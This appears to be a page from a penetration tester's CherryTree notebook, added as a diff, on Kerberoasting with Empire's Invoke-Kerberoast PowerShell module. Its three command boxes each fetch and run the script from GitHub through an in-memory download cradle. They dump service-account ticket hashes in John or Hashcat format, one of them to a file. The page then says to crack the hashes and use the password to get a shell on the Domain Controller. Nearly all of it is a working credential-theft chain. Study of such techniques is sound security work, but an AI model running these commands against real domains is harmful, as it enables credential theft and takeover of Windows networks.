@@ -1,0 +1,43 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Empire Powershell script </title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>Empire Powershell script </h1><br />Github: <a
+      href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1" target="_blank">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1</a><br /><br /><strong>Hash
+      in John The Ripper format</strong><br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#39;);Invoke-Kerberoast&nbsp;-OutputFormat&nbsp;John|Select-Object&nbsp;-ExpandProperty&nbsp;hash
+      </div>
+    </div><br /> <a href=""><img src="images/1139-1.png" alt="images/1139-1.png" /></a><br /><br /><strong>Hash in
+      Hashcat format</strong><br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#39;);Invoke-Kerberoast&nbsp;-OutputFormat&nbsp;HashCat|Select-Object&nbsp;-ExpandProperty&nbsp;hash
+      </div>
+    </div><br /> <a href=""><img src="images/1139-2.png" alt="images/1139-2.png" /></a><br /> <br /><strong>Output in a
+      file</strong><br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#39;);Invoke-Kerberoast&nbsp;-OutputFormat&nbsp;HashCat|Select-Object&nbsp;-ExpandProperty&nbsp;hash&nbsp;|&nbsp;out-file&nbsp;-Encoding&nbsp;ASCII&nbsp;kerb-Hash.txt
+      </div>
+    </div><br /> <a href=""><img src="images/1139-3.png" alt="images/1139-3.png" /></a><br /><br /><strong>
+      <h3>Now Crack it!</h3>
+    </strong><br />Now you can crack the Hash with Hashcat or John The Ripper<br /><br />When you have cracked the hash,
+    you can use the password to obtain a shell on the <span style="color:#ff8700;">Domain Controller</span> as seen in
+    the <a
+      href="ndows_Authentication_attacks--Kerberos--Kerberoasting--Orginal_method_of_Tim_Medin(Old_School)--5._Use_Password_to_obtain_shell_of_the_DC.html">Original
+      method of Tim Medin</a>(point 4)<br /><br /><br />Bibliography:<br /><a
+      href="https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/" target="_blank">https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/</a>
+  </div>
+</body>
+
+</html>
